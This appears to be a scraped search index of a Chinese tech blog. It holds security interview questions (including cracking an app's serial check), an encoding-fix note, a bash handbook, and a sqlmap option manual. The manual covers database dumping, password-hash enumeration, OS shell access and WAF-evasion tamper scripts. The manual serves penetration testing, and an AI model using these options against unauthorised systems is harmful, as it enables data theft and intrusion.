APP，打开APP时，显示：请输入正确的序列号。如序列号不正确，提示：你输入的序列号错误。问：如何对该APP进行分析破解，用最简单的，使之输入任意序列号即可使用。请描述分析方法、使用工具 2017_baidu_spring_8 1请描述PE文件加壳、脱壳步骤？ 2017_baidu_spring_9 1TCP三次握手的原理，并简单描述下端口扫描的几种实现方式及优缺点 2017_baidu_spring_10 123有N个大小不等的自然数（1–N），乱序存于数组从1到n下标的空间中，请将它们由小到大排序，不能直接赋值或输出。要求程序算法：时间复杂度为O(n)，空间复杂度为O(1)。 2017_baidu_spring_11 123对任意输入的正整数N，编写C程序求N!的尾部连续0的个数，并指出计算复杂度。如：17！＝355687428096000，尾部连续0的个数是3。（不用考虑数值超出计算机整数界限的问题 2017_baidu_spring_12 12345从其他渠道获知A站被黑，同时黑客上传了webshell（是否被黑客删除未知），该服务器上没有任何安全防御措施，只有web访问日志。假如你是安全工程师小王，请你说明如何排查快速定位问题点，同时设计有效的安全防御系统，防范类似情况发生，防御系统至少包括sql注入、上传webshell等高危漏洞的防御措施。","categories":[{"name":"面经总结","slug":"面经总结","permalink":"http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"面经","slug":"面经","permalink":"http://yoursite.com/tags/%E9%9D%A2%E7%BB%8F/"}]},{"title":"文件乱码","slug":"文件乱码","date":"2020-02-26T02:54:27.000Z","updated":"2020-02-27T09:05:01.972Z","comments":true,"path":"2020/02/26/文件乱码/","link":"","permalink":"http://yoursite.com/2020/02/26/%E6%96%87%E4%BB%B6%E4%B9%B1%E7%A0%81/","excerpt":"","text":"1 文件内容乱码。1.1 错误描述用vim或其他编辑软件打开文件显示乱码。 1.2 产生原因Linux显示在Windows编辑过的中文就会显示乱码是由于两个操作系统使用的编码不同所致。Linux下使用的编码是utf8，而Windows使用的是gb18030。因此，解决Linux打开txt文件中文乱码可有如下两种方法。 1.3 解决方案 在附件终端中，进入到txt文件所在目录，使用命令符“iconv -f gb18030 -t utf8 old.txt -o new.txt”把gb18030编码的old.txt转换成utf8的new.txt。这样new.txt就成为Linux支持的编码。 在附件终端中,使用命令符“gconf-editor”，进入环境配置，依次展开“/apps/gedit-2/preferences/encodings/”，编辑右侧的“auto_detected”将“gb18030”添加到最顶上。以后文本编辑器就可以正常显示中文了。 2 文件名乱码错误描述在linux下面显示发现文件名乱码 2.2产生原因编码不一样。 2.3 解决方案 此时做一个转码操作： 12345678convmv --notest --nosmart -f gbk -t utf8 -r 文件或者目录－f from从什么编码－t to改成什么编码--nosmart 如果已经是utf－8 忽略-r 包含所有子目录--notest 不加表示只列出有什么需要转换的，不做实际转换，所以一定要加 3 shell脚本另外一种就是平时写的sell脚本，在window那边传过来需要转码 1dos2unix xxx.sh","categories":[{"name":"错误解决","slug":"错误解决","permalink":"http://yoursite.com/categories/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"}],"tags":[{"name":"文件处理","slug":"文件处理","permalink":"http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/"}]},{"title":"shell手册","slug":"shell手册","date":"2020-02-25T16:06:36.000Z","updated":"2020-02-25T16:09:13.213Z","comments":true,"path":"2020/02/26/shell手册/","link":"","permalink":"http://yoursite.com/2020/02/26/shell%E6%89%8B%E5%86%8C/","excerpt":"","text":"1. 变量1234#!&#x2F;bin&#x2F;bashmsg&#x3D;&quot;hello world&quot;echo $msg123 变量名的命名须遵循如下规则： 命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。 中间不能有空格，可以使用下划线（_）。 不能使用标点符号。 不能使用bash里的关键字（可用help命令查看保留关键字）。 2. 传参123456#!&#x2F;bin&#x2F;bashecho &quot;执行的文件名：$0&quot;;echo &quot;第一个参数为：$1&quot;;echo &quot;第二个参数为：$2&quot;;echo &quot;第三个参数为：$3&quot;;12345 脚本内获取参数的格式为：$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……另外，还有几个特殊字符用来处理参数： 参数 说明 $# 传递到脚本的参数个数 $* 以一个单字符串显示所有向脚本传递的参数。 如&quot;$*&quot;用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。 $$ 脚本运行的当前进程ID号 $! 后台运行的最后一个进程的ID号 $@ 与$*相同，但是使用时加引号，并在引号中返回每个参数。 如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。 $- 显示Shell使用的当前选项，与set命令功能相同。 $? 显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。 3. 数组12345678910111213#!&#x2F;bin&#x2F;bashmy_array&#x3D;(A B &quot;C&quot; D)echo &quot;第一个元素为: $&#123;my_array[0]&#125;&quot;echo &quot;第二个元素为: $&#123;my_array[1]&#125;&quot;echo &quot;第三个元素为: $&#123;my_array[2]&#125;&quot;echo &quot;第四个元素为: $&#123;my_array[3]&#125;&quot;echo &quot;数组的元素为: $&#123;my_array[*]&#125;&quot;echo &quot;数组的元素为: $&#123;my_array[@]&#125;&quot;echo &quot;数组元素个数为: $&#123;#my_array[*]&#125;&quot;echo &quot;数组元素个数为: $&#123;#my_array[@]&#125;&quot;123456789101112 执行结果如下： 123456789第一个元素为: A第二个元素为: B第三个元素为: C第四个元素为: D数组的元素为: A B C D数组的元素为: A B C D数组元素个数为: 4数组元素个数为: 412345678 4. 基本运算符 原生 bash 不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。 expr 是一款表达式计算工具，使用它能完成表达式的求值操作。 ① 算数运算符1234567#!&#x2F;bin&#x2F;bashecho &quot;2加2等于&quot;&#96;expr 2 + 2&#96;echo &quot;2减2等于&quot;&#96;expr 2 - 2&#96;echo &quot;2乘2等于&quot;&#96;expr 2 \\* 2&#96;echo &quot;2除2等于&quot;&#96;expr 2 &#x2F; 2&#96;echo &quot;2除2取余&quot;&#96;expr 2 % 2&#96;123456 ② 关系运算符12345678910#!&#x2F;bin&#x2F;basha&#x3D;10b&#x3D;20if [ $a -eq $b ] # 检测两个数是否相等，相等返回 true。if [ $a -ne $b ] # 检测两个数是否不相等，不相等返回 true。if [ $a -gt $b ] # 检测左边的数是否大于右边的，如果是，则返回 true。if [ $a -lt $b ] # 检测左边的数是否小于右边的，如果是，则返回 true。if [ $a -ge $b ] # 检测左边的数是否大于等于右边的，如果是，则返回 true。if [ $a -le $b ] # 检测左边的数是否小于等于右边的，如果是，则返回 true。123456789 ③ 布尔运算符12345#!&#x2F;bin&#x2F;bashif [ ! false ] # 非运算，返回 trueif [ true -o false ] # 或运算，返回 trueif [ true -a false ] # 与运算，返回 false1234 ④ 逻辑运算符12345678#!&#x2F;bin&#x2F;basha&#x3D;10b&#x3D;20if [[ $a -lt $b &amp;&amp; $a -gt $b ]] # 逻辑的 AND, 返回 falseif [ $a -lt $b ] &amp;&amp; [ $a -gt $b ] # 逻辑的 AND, 返回 falseif [[ $a -lt $b || $a -gt $b ]] # 逻辑的 OR, 返回 trueif [ $a -lt $b ] || [ $a -gt $b ] # 逻辑的 OR, 返回 true1234567 ⑤ 字符串运算符123456789#!&#x2F;bin&#x2F;basha&#x3D;&quot;abc&quot;b&#x3D;&quot;efg&quot;if [ $a &#x3D; $b ] # 检测两个字符串是否相等，相等返回 true。if [ $a !&#x3D; $b ] # 检测两个字符串是否相等，不相等返回 true。if [ -z $a ] # 检测字符串长度是否为0，为0返回 true。if [ -n &quot;$a&quot; ] # 检测字符串长度是否为0，不为0返回 true。if [ $a ] # 检测字符串是否为空，不为空返回 true。12345678 ⑥ 文件测试运算符文件测试运算符用于检测 Unix 文件的各种属性。 操作符 说明 -b file 检测文件是否是块设备文件，如果是，则返回 true。 -c file 检测文件是否是字符设备文件，如果是，则返回 true。 -d file 检测文件是否是目录，如果是，则返回 true。 -f file 检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。 -g file 检测文件是否设置了 SGID 位，如果是，则返回 true。 -k file 检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。 -p file 检测文件是否是有名管道，如果是，则返回 true。 -u file 检测文件是否设置了 SUID 位，如果是，则返回 true。 -r file 检测文件是否可读，如果是，则返回 true。 -w file 检测文件是否可写，如果是，则返回 true。 -x file 检测文件是否可执行，如果是，则返回 true。 -s file 检测文件是否为空（文件大小是否大于0），不为空返回 true。 -e file 检测文件（包括目录）是否存在，如果是，则返回 true。 5. echo① 命令格式1234567891011#!&#x2F;bin&#x2F;bashecho &quot;It is a test&quot;echo It is a testecho &quot;\\&quot;It is a test\\&quot;&quot; # 转义name&#x3D;Chrisecho &quot;$name is handsome&quot;echo -e &quot;OK! \\n&quot; # 显示换行 -e 开启转义echo &quot;It is a test&quot; &gt; myfile # 显示结果定向至文件echo &#39;$name\\&quot;&#39; # 原样输入字符串，不进行转义或取变量（使用单引号）echo &#96;date&#96; # 显示命令执行结构12345678910 ② 颜色显示12345678910111213141516171819202122232425262728293031323334353637383940echo -e &quot;\\033[字背景颜色；文字颜色m字符串\\033[0m&quot;echo -e “\\033[30m 黑色字 \\033[0m”echo -e “\\033[31m 红色字 \\033[0m”echo -e “\\033[32m 绿色字 \\033[0m”echo -e “\\033[33m 黄色字 \\033[0m”echo -e “\\033[34m 蓝色字 \\033[0m”echo -e “\\033[35m 紫色字 \\033[0m”echo -e “\\033[36m 天蓝字 \\033[0m”echo -e “\\033[37m 白色字 \\033[0m”echo -e “\\033[40;37m 黑底白字 \\033[0m”echo -e “\\033[41;37m 红底白字 \\033[0m”echo -e “\\033[42;37m 绿底白字 \\033[0m”echo -e “\\033[43;37m 黄底白字 \\033[0m”echo -e “\\033[44;37m 蓝底白字 \\033[0m”echo -e “\\033[45;37m 紫底白字 \\033[0m”echo -e “\\033[46;37m 天蓝底白字 \\033[0m”echo -e “\\033[47;30m 白底黑字 \\033[0m”\\33[0m 关闭所有属性\\33[1m 设置高亮度\\33[4m 下划线\\33[5m 闪烁\\33[7m 反显\\33[8m 消隐\\33[30m — \\33[37m 设置前景色\\33[40m — \\33[47m 设置背景色\\33[nA 光标上移n行\\33[nB 光标下移n行\\33[nC 光标右移n行\\33[nD 光标左移n行\\33[y;xH设置光标位置\\33[2J 清屏\\33[K 清除从光标到行尾的内容\\33[s 保存光标位置\\33[u 恢复光标位置\\33[?25l 隐藏光标\\33[?25h 显示光标123456789101112131415161718192021222324252627282930313233343536373839 6. sprintf123456#!&#x2F;bin&#x2F;bashprintf &quot;%-10s %-8s %-4s\\n&quot; 姓名 性别 体重kg printf &quot;%-10s %-8s %-4.2f\\n&quot; 郭靖 男 66.1234printf &quot;%-10s %-8s %-4.2f\\n&quot; 杨过 男 48.6543printf &quot;%-10s %-8s %-4.2f\\n&quot; 郭芙 女 47.987612345 结果： 12345姓名 性别 体重kg郭靖 男 66.12杨过 男 48.65郭芙 女 47.991234 %s %c %d %f 都是格式替代符d: Decimal 十进制整数 – 对应位置参数必须是十进制整数，否则报错！s: String 字符串 – 对应位置参数必须是字符串或者字符型，否则报错！c: Char 字符 – 对应位置参数必须是字符串或者字符型，否则报错！f: Float 浮点 – 对应位置参数必须是数字型，否则报错！%-10s 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐）,任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。%-4.2f 指格式化为小数，其中.2指保留2位小数。 7. testShell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。 12345#!&#x2F;bin&#x2F;bashnum1&#x3D;100num2&#x3D;100if test $[num1] -eq $[num2]1234 8. 流程控制① if-else12345678910111213141516#!&#x2F;bin&#x2F;basha&#x3D;10b&#x3D;20if [ $a &#x3D;&#x3D; $b ]then echo &quot;a 等于 b&quot;elif [ $a -gt $b ]then echo &quot;a 大于 b&quot;elif [ $a -lt $b ]then echo &quot;a 小于 b&quot;else echo &quot;没有符合的条件&quot;fi123456789101112131415 ② for123456#!&#x2F;bin&#x2F;bashfor loop in 1 2 3 4 5do echo &quot;The value is: $loop&quot;done12345 ③ while12345678#!&#x2F;bin&#x2F;bashint&#x3D;1while(( $int&lt;&#x3D;5 ))do echo $int let &quot;int++&quot;done1234567 ④ case1234567891011121314151617#!&#x2F;bin&#x2F;bashecho &#39;输入 1 到 4 之间的数字:&#39;echo &#39;你输入的数字为:&#39;read aNumcase $aNum in 1) echo &#39;你选择了 1&#39; ;; 2) echo &#39;你选择了 2&#39; ;; 3) echo &#39;你选择了 3&#39; ;; 4) echo &#39;你选择了 4&#39; ;; *) echo &#39;你没有输入 1 到 4 之间的数字&#39; ;;esac12345678910111213141516 ⑤ breakbreak命令允许跳出所有循环（终止执行后面的所有循环）。 1234567891011121314#!&#x2F;bin&#x2F;bashwhile :do echo -n &quot;输入 1 到 5 之间的数字:&quot; read aNum case $aNum in 1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot; ;; *) echo &quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot; break ;; esacdone12345678910111213 ⑥ continue跳出当前循环。 123456789101112131415#!&#x2F;bin&#x2F;bashwhile :do echo -n &quot;输入 1 到 5 之间的数字: &quot; read aNum case $aNum in 1|2|3|4|5) echo &quot;你输入的数字为 $aNum!&quot; ;; *) echo &quot;你输入的数字不是 1 到 5 之间的!&quot; continue echo &quot;游戏结束&quot; ;; esacdone1234567891011121314 ⑦ until12345678910#!&#x2F;bin&#x2F;basha&#x3D;0until [ ! $a -lt 10 ]do echo $a a&#x3D;&#96;expr $a + 1&#96;done123456789 9. 函数12345678910111213#!&#x2F;bin&#x2F;bashfunWithParam()&#123; echo &quot;第一个参数为 $1 !&quot; echo &quot;第二个参数为 $2 !&quot; echo &quot;第十个参数为 $10 !&quot; echo &quot;第十个参数为 $&#123;10&#125; !&quot; echo &quot;第十一个参数为 $&#123;11&#125; !&quot; echo &quot;参数总数有 $# 个!&quot; echo &quot;作为一个字符串输出所有参数 $* !&quot;&#125;funWithParam 1 2 3 4 5 6 7 8 9 34 73123456789101112 结果： 12345678第一个参数为 1 !第二个参数为 2 !第十个参数为 10 !第十个参数为 34 !第十一个参数为 73 !参数总数有 11 个!作为一个字符串输出所有参数 1 2 3 4 5 6 7 8 9 34 73 !1234567 10. 输入输出12345678910#!&#x2F;bin&#x2F;bashwho &gt; today.log # 执行结果覆盖到文件 today.logecho &quot;菜鸟教程：www.runoob.com&quot; &gt;&gt; today.log # 执行结果追加到文件 today.logwc -l &lt; today.log # 统计 today.log 行数wc -l &lt;&lt; EOF 李白 苏轼 王勃EOF123456789 11. 文件包含test1.sh 123#!&#x2F;bin&#x2F;bashname&#x3D;&quot;Chris&quot;12 test2.sh 123456789#!&#x2F;bin&#x2F;bash#使用 . 号来引用test1.sh 文件. .&#x2F;test1.sh# 或者使用以下包含文件代码# source .&#x2F;test1.shecho $name12345678 注：被包含的文件 test1.sh 不需要可执行权限。","categories":[{"name":"编程手册","slug":"编程手册","permalink":"http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E6%89%8B%E5%86%8C/"}],"tags":[{"name":"shell编程","slug":"shell编程","permalink":"http://yoursite.com/tags/shell%E7%BC%96%E7%A8%8B/"}]},{"title":"sqlmap手册","slug":"sqlmap","date":"2020-02-25T15:24:36.000Z","updated":"2020-02-25T15:07:33.785Z","comments":true,"path":"2020/02/25/sqlmap/","link":"","permalink":"http://yoursite.com/2020/02/25/sqlmap/","excerpt":"","text":"sqlmap五种注入模式： 基于布尔的盲注，即可以根据返回页面判断条件真假的注入； 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断； 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中； 联合查询注入，可以使用union的情况下的注入； 堆查询注入，可以同时执行多条语句的执行时的注入 参数选项 -h,–help 显示基本帮助信息并退出 -hh 显示高级帮助信息并退出 –version 显示程序版本信息并退出 -v VERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。 目标 在这些选项中必须提供至少有一个确定目标 -d DIRECT 直接连接数据库的连接字符串 -u URL, –url=URL 目标URL (e.g.”http://www.site.com/vuln.php?id=1“)，使用-u或者–url -l LOGFILE 从Burp或者WebScarab代理日志文件中分析目标 -x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标 -m BULKFILE 将目标地址保存在文件中，一行为一个URL地址进行批量检测。 -r REQUESTFILE 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443 -g GOOGLEDORK 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理） -c CONFIGFILE 从配置ini文件中加载选项 请求 这些选项可以用来指定如何连接到目标URL -–method=METHOD 强制使用给定的HTTP方法（例如put） –data=DATA 通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。–data=”id=1” -f –banner –dbs –users -–param-del=PARA.. 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。 –cookie=COOKIE HTTP Cookieheader 值 –cookie-del=COO.. 用来分隔cookie的字符串值 –load-cookies=L.. Filecontaining cookies in Netscape/wget format 包含Netscape / wget格式的cookie的文件 –drop-set-cookie IgnoreSet-Cookie header from response 从响应中忽略Set-Cookie头 –user-agent=AGENT 默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(http://sqlmap.org)可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入 –random-agent 使用random-agent作为HTTP User-Agent头值 –host=HOST HTTP Hostheader value HTTP主机头值 –referer=REFERER sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入 -H HEADER, –hea.. 额外的http header头(e.g.”X-Forwarded-For: 127.0.0.1″) –headers=HEADERS 可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\\nETag: 123″) –auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI) –auth-cred=AUTH.. HTTP 认证凭证(name:password) –auth-file=AUTH.. HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。 –ignore-401 Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的） –ignore-proxy 忽略系统的默认代理设置 –ignore-redirects 忽略重定向的尝试 –ignore-timeouts 忽略连接超时 –proxy=PROXY 使用代理服务器连接到目标URL –proxy-cred=PRO.. 代理认证凭证(name:password) –proxy-file=PRO.. 从文件加载代理列表 –tor 使用Tor匿名网络 –tor-port=TORPORT 设置Tor代理端口 -–tor-type=TORTYPE 设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省)) –check-tor 检查Tor的是否正确使用 –delay=DELAY 可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。 –timeout=TIMEOUT 可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。 –retries=RETRIES 当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。 –randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样 –safe-url=SAFEURL 提供一个安全不错误的连接，每隔一段时间都会去访问一下 –safe-post=SAFE.. 提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。 –safe-req=SAFER.. 从文件中加载安全HTTP请求 –safe-freq=SAFE.. 测试一个给定安全网址的两个访问请求 –skip-urlencode 跳过URL的有效载荷数据编码 –csrf-token=CSR.. Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌 –csrf-url=CSRFURL URL地址访问提取anti-CSRF令牌 –force-ssl 强制使用SSL/HTTPS –hpp 使用HTTP参数污染的方法 –eval=EVALCODE 在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”) sqlmap.py -u”http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b“–eval=”import hashlib;hash=hashlib.md5(id).hexdigest()” 优化 这些选项可用于优化sqlmap性能 -o 打开所有的优化开关 –predict-output 预测普通查询输出 –keep-alive 使用持久HTTP（S）连接 –null-connection 从没有实际的HTTP响应体中检索页面长度 –threads=THREADS 当前http(s)最大请求数 (默认 1) 注入 这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。 -p TESTPARAMETER 可测试的参数 –skip=SKIP 跳过对给定参数的测试 –skip-static 跳过测试不显示为动态的参数 –param-exclude=.. 使用正则表达式排除参数进行测试（e.g. “ses”） –dbms=DBMS 强制后端的DBMS为此值 –dbms-cred=DBMS.. DBMS认证凭证(user:password) –os=OS 强制后端的DBMS操作系统为这个值 –invalid-bignum 使用大数字使值无效 –invalid-logical 使用逻辑操作使值无效 –invalid-string 使用随机字符串使值无效 –no-cast 关闭有效载荷铸造机制 –no-escape 关闭字符串逃逸机制 –prefix=PREFIX 注入payload字符串前缀 –suffix=SUFFIX 注入payload字符串后缀 –tamper=TAMPER 使用给定的脚本篡改注入数据 检测 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容 –level=LEVEL 执行测试的等级（1-5，默认为1） –risk=RISK 执行测试的风险（0-3，默认为1） –string=STRING 查询时有效时在页面匹配字符串 –not-string=NOT.. 当查询求值为无效时匹配的字符串 –regexp=REGEXP 查询时有效时在页面匹配正则表达式 –code=CODE 当查询求值为True时匹配的HTTP代码 –text-only 仅基于在文本内容比较网页 –titles 仅根据他们的标题进行比较 技巧 这些选项可用于调整具体的SQL注入测试 –technique=TECH SQL注入技术测试（默认BEUST） –time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒） –union-cols=UCOLS 定列范围用于测试UNION查询注入 –union-char=UCHAR 暴力猜测列的字符数 –union-from=UFROM SQL注入UNION查询使用的格式 –dns-domain=DNS.. DNS泄露攻击使用的域名 –second-order=S.. URL搜索产生的结果页面 指纹 -f, –fingerprint 执行广泛的DBMS版本指纹检查 枚举 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。 -a, –all 获取所有信息 -b, –banner 获取数据库管理系统的标识 –current-user 获取数据库管理系统当前用户 –current-db 获取数据库管理系统当前数据库 –hostname 获取数据库服务器的主机名称 –is-dba 检测DBMS当前用户是否DBA –users 枚举数据库管理系统用户 –passwords 枚举数据库管理系统用户密码哈希 –privileges 枚举数据库管理系统用户的权限 –roles 枚举数据库管理系统用户的角色 –dbs 枚举数据库管理系统数据库 –tables 枚举的DBMS数据库中的表 –columns 枚举DBMS数据库表列 –schema 枚举数据库架构 –count 检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb –dump 转储数据库表项 –dump-all 转储数据库所有表项 –search 搜索列（S），表（S）和/或数据库名称（S） –comments 获取DBMS注释 -D DB 要进行枚举的指定数据库名 -T TBL DBMS数据库表枚举 -C COL DBMS数据库表列枚举 -X EXCLUDECOL DBMS数据库表不进行枚举 -U USER 用来进行枚举的数据库用户 –exclude-sysdbs 枚举表时排除系统数据库 –pivot-column=P.. Pivot columnname –where=DUMPWHERE Use WHEREcondition while table dumping –start=LIMITSTART 获取第一个查询输出数据位置 –stop=LIMITSTOP 获取最后查询的输出数据 –first=FIRSTCHAR 第一个查询输出字的字符获取 –last=LASTCHAR 最后查询的输出字字符获取 –sql-query=QUERY 要执行的SQL语句 –sql-shell 提示交互式SQL的shell –sql-file=SQLFILE 要执行的SQL文件 暴力这些选项可以被用来运行暴力检查 –common-tables 检查存在共同表 –common-columns 检查存在共同列 用户自定义函数注入 这些选项可以用来创建用户自定义函数 –udf-inject 注入用户自定义函数 –shared-lib=SHLIB 共享库的本地路径 访问文件系统 这些选项可以被用来访问后端数据库管理系统的底层文件系统 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe: –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 操作系统访问这些选项可以用于访问后端数据库管理系统的底层操作系统 –os-cmd=OSCMD 执行操作系统命令（OSCMD） –os-shell 交互式的操作系统的shell –os-pwn 获取一个OOB shell，meterpreter或VNC –os-smbrelay 一键获取一个OOBshell，meterpreter或VNC –os-bof 存储过程缓冲区溢出利用 –priv-esc 数据库进程用户权限提升 –msf-path=MSFPATH MetasploitFramework本地的安装路径 –tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问 这些选项可以被用来访问后端数据库管理系统Windows注册表 –reg-read 读一个Windows注册表项值 –reg-add 写一个Windows注册表项值数据 –reg-del 删除Windows注册表键值 –reg-key=REGKEY Windows注册表键 –reg-value=REGVAL Windows注册表项值 –reg-data=REGDATA Windows注册表键值数据 –reg-type=REGTYPE Windows注册表项值类型 一般选项 这些选项可以用来设置一些一般的工作参数 -s SESSIONFILE 保存和恢复检索会话文件的所有数据 -t TRAFFICFILE 记录所有HTTP流量到一个文本文件中 –batch 从不询问用户输入，使用所有默认配置。 –binary-fields=.. 结果字段具有二进制值(e.g.”digest”) –charset=CHARSET 强制字符编码 –crawl=CRAWLDEPTH 从目标URL爬行网站 –crawl-exclude=.. 正则表达式从爬行页中排除 –csv-del=CSVDEL 限定使用CSV输出 (default”,”) –dump-format=DU.. 转储数据格式(CSV(default), HTML or SQLITE) –eta 显示每个输出的预计到达时间 –flush-session 刷新当前目标的会话文件 –forms 解析和测试目标URL表单 –fresh-queries 忽略在会话文件中存储的查询结果 –hex 使用DBMS Hex函数数据检索 –output-dir=OUT.. 自定义输出目录路径 –parse-errors 解析和显示响应数据库错误信息 –save=SAVECONFIG 保存选项到INI配置文件 –scope=SCOPE 从提供的代理日志中使用正则表达式过滤目标 –test-filter=TE.. 选择测试的有效载荷和/或标题(e.g. ROW) –test-skip=TEST.. 跳过试验载荷和/或标题(e.g.BENCHMARK) –update 更新sqlmap 其他 -z MNEMONICS 使用短记忆法 (e.g.”flu,bat,ban,tec=EU”) –alert=ALERT 发现SQL注入时，运行主机操作系统命令 –answers=ANSWERS 当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N” –batch –beep 发现sql注入时，发出蜂鸣声。 –cleanup 清除sqlmap注入时在DBMS中产生的udf与表。 –dependencies Check formissing (non-core) sqlmap dependencies –disable-coloring 默认彩色输出，禁掉彩色输出。 –gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试 –identify-waf 进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别 –mobile 有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。 –offline Work inoffline mode (only use session data) –purge-output 从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。 –skip-waf 跳过WAF／IPS / IDS启发式检测保护 –smart 进行积极的启发式测试，快速判断为注入的报错点进行注入 –sqlmap-shell 互动提示一个sqlmapshell –tmp-dir=TMPDIR 用于存储临时文件的本地目录 –web-root=WEBROOT Web服务器的文档根目录(e.g.”/var/www”) –wizard 新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入 tamper space2comment.py用/**/代替空格 apostrophemask.py用utf8代替引号 equaltolike.pylike代替等号 space2dash.py 绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’） greatest.py 绕过过滤’&gt;’ ,用GREATEST替换大于号。 space2hash.py空格替换为#号,随机字符串以及换行符 apostrophenullencode.py绕过过滤双引号，替换字符和双引号。 halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 space2morehash.py空格替换为 #号 以及更多随机字符串 换行符 appendnullbyte.py在有效负荷结束位置加载零字节字符编码 ifnull2ifisnull.py 绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py(mssql)空格替换为其它空符号 base64encode.py 用base64编码替换 space2mssqlhash.py 替换空格 modsecurityversioned.py过滤空格，包含完整的查询版本注释 space2mysqlblank.py 空格替换其它空白符号(mysql) between.py用between替换大于号（&gt;） space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’） multiplespaces.py围绕SQL关键字添加多个空格 space2plus.py用+替换空格 bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like nonrecursivereplacement.py双重查询语句,取代SQL关键字 space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集 sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 chardoubleencode.py双url编码(不处理以编码的) unionalltounion.py替换UNION ALLSELECT UNION SELECT charencode.py url编码 randomcase.py随机大小写 unmagicquotes.py宽字符绕过 GPCaddslashes randomcomments.py用/**/分割sql关键字 charunicodeencode.py字符串 unicode 编码 securesphere.py追加特制的字符串 versionedmorekeywords.py注释绕过 space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’ 